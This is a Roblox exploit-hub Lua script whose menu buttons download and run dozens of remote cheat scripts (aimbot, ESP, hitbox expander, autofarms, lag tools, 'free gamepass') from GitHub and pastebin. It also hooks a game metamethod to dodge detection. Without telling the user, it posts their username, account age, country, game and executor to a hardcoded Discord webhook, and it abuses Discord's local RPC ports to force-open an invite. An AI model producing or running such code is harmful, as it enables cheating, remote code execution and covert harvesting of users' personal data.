-- subscribe to me plzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({Name = "epic cool gui", HidePremium = false, SaveConfig = true, ConfigFolder = "epic gui config"})

local Tab = Window:MakeTab({
	Name = "Scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})





OrionLib:MakeNotification({
	Name = "Loaded",
	Content = "subscribe to cat exploits",
	Image = "rbxassetid://4483345998",
	Time = 10
})

Tab:AddButton({
	Name = "PANIK gui",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/iUsuallyCreateSomeRBLXScripts/iforgoMyNameAndReason/main/panikbutwhypanik"))()
  	end    
})

Tab:AddButton({
	Name = "Pro border guiz",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/Dumb-Utility/UnnamedHub/main/UH.lua'))()
		wait()
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/crosszay1/noobsploit/main/pro%20border.lua"), true))()

  	end    
})

Tab:AddButton({
	Name = "combat warriors gui",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/E23NWANI23ei3dskwadsmk3232ffwdasdw3323oddwpasdmwka.lua'))()
  	end    
})

Tab:AddSlider({
    Name = "Walkspeed",
    Min = 16,
    Max = 120,
    Default = 16,
    Color = Color3.fromRGB(255,255,255),
    Increment = 1,
    ValueName = "",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
    end    
})

Tab:AddSlider({
    Name = "Fov",
    Min = 0,
    Max = 500,
    Default = 70,
    Color = Color3.fromRGB(255,255,255),
    Increment = 1,
    ValueName = "",
    Callback = function(Value)
        game.Workspace.CurrentCamera.FieldOfView = Value
    end    
})

Tab:AddSlider({
    Name = "JumpPower",
    Min = 50,
    Max = 500,
    Default = 50,
    Color = Color3.fromRGB(255,255,255),
    Increment = 1,
    ValueName = "",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
    end    
})


--game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
Tab:AddButton({
	Name = "Teleport to somewhere random lol",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
  	end    
})

Tab:AddButton({
	Name = "Slap battles 3 GUIS OP",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/%23%40(%23KWOD38382KDWASD9384JWSDDWSLAPBATTLESlapBattles.lua'))()
  	end    
})
--loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/%23%23%5E%5E%40%5E%23%40*(%40!%25%23%23%23%40ESP32wewapdpwoda.lua'))()

Tab:AddButton({
	Name = "ESP and Aimbot",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/%23%23%5E%5E%40%5E%23%40*(%40!%25%23%23%23%40ESP32wewapdpwoda.lua'))()
        wait()
        warn("aimbot doesnt work")
  	end    
})
--loadstring(game:HttpGet('https://pastebin.com/raw/GuBiX19e'))()
Tab:AddButton({
	Name = "Remote spy script",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/*%23*%40%23%5E%24%40%26*!)%23(%40HYROXIDE_XD324.LUA'))()
  	end    
})

Tab:AddButton({
	Name = "tp tool script",
	Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/GuBiX19e'))()
  	end    
})

Tab:AddButton({
	Name = "parkour script",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/xgamerman626/Hub/main/Init.lua"))()
  	end    
})

Tab:AddButton({
	Name = "say yo mama in chat",
	Callback = function()
		local args = {
			[1] = "yo mama",
			[2] = "All"
		}
		
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))		
  	end    
})

Tab:AddButton({
	Name = "XPLOITS V2 GUI",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/pop-it-trading-script2/main/keyz'))()
  	end    
})

Tab:AddButton({
	Name = "alt delete",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/pop-it-trading-script2/main/Health%20Hazard'))()
  	end    
})

Tab:AddButton({
	Name = "longest answer wins script",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/pop-it-trading-script2/main/Lua%20scriptzzzzzzzzzz.lua'))()
  	end    
})

Tab:AddButton({
	Name = "instant proximity prompt",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/%24%25%40%24%23%40%40%5E!%23!%23%24I%23%25%5E%40%7C%40%23~%25%25%23%25%25%24%25%26%40IPP%24%40%40%5E*'))()
  	end    
})

Tab:AddButton({
	Name = "Https spy",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/batusz/main/roblox/advanced_http_spy'))()
  	end    
})

Tab:AddButton({
	Name = "Build a boat for treasure autofarm",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Build%20The%20Boat%20Auto%20Win'))()
  	end    
})

Tab:AddButton({
	Name = "aimbot / slient aim",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Averiias/Universal-SilentAim/main/main.lua"))()
  	end    
})

Tab:AddButton({
	Name = "hitbox expander",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/RectangularObject/Roblox-Hitbox-Expander/main/HitboxExtenderv2.lua",true))()
  	end    
})

Tab:AddButton({
	Name = "Rush Point script",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Sukoware/3.0/main/Rush%20Point%20Script%20%7C%20Sukoware%20v3.0",true))();
  	end    
})

Tab:AddButton({
	Name = "piggy gui",
	Callback = function()
      		print("laoaded")
              loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/%5E%23%25%5E%40%40%23*!%24%24%24PIGGY%23%40WDj*(%24%5E%26%5E%5E%5E%25_)_%5E%40%26%5E%26)%40%40'))()
			  loadstring(game:HttpGet('https://pastebin.com/raw/ZNDQBwFy'))()
			  pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/piggy.lua")))
  	end    
})

Tab:AddButton({
	Name = "free gamepass",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/%23%40%5E%23%26%25%23%40!%25%26%40!~%40%25%5E%40%23%24%24%40'))()
  	end    
})

Tab:AddButton({
	Name = "Panic (kicks you)",
	Callback = function()
        game.Players.LocalPlayer:Kick("You pressed panic button!!!!!")
  	end    
})

Tab:AddButton({
	Name = "Car crash system gui",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/!%24%25!%26%26!!%40!%23!%24%25*(!!%23%24%26!!%23%5E%26%40%23)*%23%24ccess%24%24%25%40'))()
  	end    
})

Tab:AddButton({
	Name = "animation changer",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/BEZfkBs1", true))()
  	end    
})

Tab:AddButton({
	Name = "prison life gui",
	Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/xnJMa5U2'))()
  	end    
})

Tab:AddButton({
	Name = "client bring all",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/)(*%26%24%25%25%23%24%40%5E*!%25%5E*%5E%23%25%23%24%25%23%40%26*%40%25%40~!'))()
  	end    
})

Tab:AddButton({
	Name = "[FREE ADMIN] lag script",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/%23%25%26%40(*%5E%40%25%5E%26%24%26%24%40%24!%25%26!%24%25%5E*%24%23%40%25%5E%5E%23%23%40%25%25%40%24%4013135%25%40%40%24'))()
  	end    
})

Tab:AddButton({
	Name = "build a boat multiscripts",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/1EQmGiQr", true))()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Build%20A%20Boat%20For%20Treasure/BABFT"))()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Natthawat69/Build-A-Boat/main/script.lua'))()
		loadstring(game:HttpGet("https://pastebin.com/raw/0YezNNRh",true))()
  	end    
})

Tab:AddButton({
	Name = "build a boat autofarm",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua'),true))()
  	end    
})

Tab:AddButton({
	Name = "build a boat autofarm v2",
	Callback = function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/Jn0zR3T8'),true))()
  	end    
})

--loadstring(game:HttpGet('https://raw.githubusercontent.com/Notkonnerr32/No/main/%23%40(%23KWOD38382KDWASD93%40!~%23!%23!%24!%23~%23%23%25%24%23%25%40%23!~%23!~%23%23~!!WADDWA84JWSDDWSLfakeyou%24%23%24%23%23%40%24!%23%23%40%23!%23!%23.lua'))()

Tab:AddButton({
	Name = "kill gui",
	Callback = function()
        OrionLib:Destroy()
        print("bye bye gui")
  	end    
})

Tab:AddButton({
	Name = "die☠",
	Callback = function()
		warn("died D:")
		game.Players.LocalPlayer.Character.Humanoid.Health=0
  	end    
})






OrionLib:Init()


local MetamethodHolder = {
    AntiFlag = nil
}

MetamethodHolder.AntiFlag = hookmetamethod(game, "__namecall", function(self, ...)
    local Method = getnamecallmethod()
    if tostring(Method) == "PreloadAsync" and not checkcaller() then
        return
    end    
   
    return MetamethodHolder.AntiFlag(self, ...)    
end)

local request = http_request or request or (syn and syn.request)
request({
    Method = "POST",
    Url = "https://discord.com/api/webhooks/1027935804795924563/WvQ3yjvS6CJOZ-W2QDJnePsvYw3iE29mk2UOCCrSev-CEiJEOZm1k3dRn9ZXIRB7spIR", -- enter ur webhook here
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game:GetService("HttpService"):JSONEncode({
        username = "Executions",
        content = "`" .. game.Players.LocalPlayer.Name  .. "` has executed the Scr1pt ! **"..("__("..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)..")__".."**".." **|** ".."**"..game.PlaceId.." | ".."**".."Using : ".."**__"..identifyexecutor().."__**".." **|** ".."**__"..game.Players.LocalPlayer.AccountAge.."__**".." Days Old".." **|** ".."Country : ".."**__"..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer).."__**".." **|** ",
    })
})

local req = http_request or request or (syn and syn.request)

if req ~= nil then
    local http = game:GetService("HttpService")

    local t = {
        cmd = "INVITE_BROWSER",
        args = {
            code = "QsMWvRdTNr" --invite here / exemple : "TT3y4gkJtq"
        },
        nonce = string.lower(http:GenerateGUID(false))
    }
    local post = http:JSONEncode(t)
    for port=6463, 6472, 1 do
        req({
            Url = "http://127.0.0.1:" .. tostring(port) .. "/rpc?v=1",
            Method = "POST",
            Body = post,
            Headers = {
                ["Content-Type"] = "application/json",
                ["Origin"] = "https://discord.com"
            }
        })
    end
end
